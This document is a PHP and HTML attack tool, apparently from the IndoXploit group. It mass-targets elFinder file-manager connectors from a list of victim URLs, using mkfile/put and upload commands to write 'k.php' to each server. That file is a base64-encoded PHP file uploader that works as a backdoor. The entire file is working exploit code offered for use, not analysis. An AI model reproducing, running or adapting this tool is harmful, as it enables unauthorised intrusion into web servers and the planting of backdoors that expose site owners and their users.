<html>
    <title>Elfinder Auto Xploiter</title>
<style type="text/css">
html {
	text-align: center;
}
a {
	text-decoration: none;
	color: black;
}
</style>
<form method="post">
Target: <br>
<textarea name="target" placeholder="http://www.target.com/elFinder/php/connector.php" style="width: 600px; height: 250px; margin: 5px auto; resize: none;"></textarea><br>
<input type="submit" name="x" style="width: 150px; height: 25px; margin: 5px;" value="hajar">
</form>
</html>
<?php
# IndoXploit
function ngirim($url, $isi) { 
$ch = curl_init ("$url");
	  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	  curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
	  curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	  curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
	  curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
	  curl_setopt ($ch, CURLOPT_POST, 1);
	  curl_setopt ($ch, CURLOPT_POSTFIELDS, $isi);
	  curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
	  curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);
return $data3;
}
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
	foreach($target as $korban) {
		$nama_doang = "k.php";
		$isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($nama_doang);
		$fp = fopen($nama_doang,"w");
		fputs($fp, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "# Upload[1] ......<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$nama_doang&target=l1_Lw";
		$b = file_get_contents("$url_mkfile");
 		$post1 = array(
				"cmd" => "put",
				"target" => "l1_$encode",
				"content" => "$decode_isi",
				);
 		$post2 = array(
 				"current" => "8ea8853cb93f2f9781e0bf6e857015ea",
 				"upload[]" => "@$nama_doang",);
 		$output_mkfile = ngirim("$korban", $post1);
 		if(preg_match("/$nama_doang/", $output_mkfile)) {
    		echo "# Upload Success 1... => $nama_doang<br># Coba buka di ../../elfinder/files/...<br><br>";
		} else {
 			echo "# Upload Failed 1 <br># Uploading 2..<br>";
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			if(preg_match("/$nama_doang/", $upload_ah)) {
    			echo "# Upload Success 2 => $nama_doang<br># Coba buka di ../../elfinder/files/...<br><br>";
			} else {
    			echo "# Upload Failed 2<br><br>";
			}
		}
	}
}
?>
